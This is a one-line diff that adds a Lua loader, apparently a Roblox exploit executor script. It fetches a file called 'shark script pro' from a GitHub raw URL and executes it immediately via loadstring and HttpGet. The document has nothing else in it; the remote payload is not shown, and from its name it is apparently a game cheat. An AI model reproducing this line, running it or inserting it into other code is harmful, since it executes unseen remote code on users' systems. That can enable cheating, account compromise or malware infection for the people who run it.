@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/11451466666/shark-lol/main/shark%20script%20pro.txt",true))()
